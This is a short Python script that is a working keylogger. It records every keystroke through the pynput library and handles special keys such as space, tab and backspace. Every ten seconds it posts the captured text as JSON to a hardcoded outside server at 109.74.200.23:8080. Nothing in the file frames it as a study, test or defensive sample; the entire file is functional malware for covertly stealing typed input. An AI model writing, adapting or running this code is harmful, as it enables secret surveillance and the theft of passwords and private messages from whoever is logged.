import socket
import threading
import pynput
import requests
import json

# Server details
SERVER_IP = "109.74.200.23"
SERVER_PORT = 8080

# Global variable to store keystrokes
text = ""

# Time interval in seconds for code to execute
time_interval = 10

def send_post_req():
    try:
        # Convert the keystrokes to a JSON string
        payload = json.dumps({"keyboardData": text})
        # Send the POST request to the server
        r = requests.post(f"http://{SERVER_IP}:{SERVER_PORT}", data=payload, headers={"Content-Type": "application/json"})
        # Set up a timer function to run every time_interval seconds
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request: {e}")

def on_press(key):
    global text
    if key == pynput.keyboard.Key.enter:
        text += "\n"
    elif key == pynput.keyboard.Key.tab:
        text += "\t"
    elif key == pynput.keyboard.Key.space:
        text += " "
    elif key == pynput.keyboard.Key.shift:
        pass
    elif key == pynput.keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == pynput.keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == pynput.keyboard.Key.ctrl_l or key == pynput.keyboard.Key.ctrl_r:
        pass
    elif key == pynput.keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function, we specified how to deal with the different inputs received by the listener.
with pynput.keyboard.Listener(
    on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
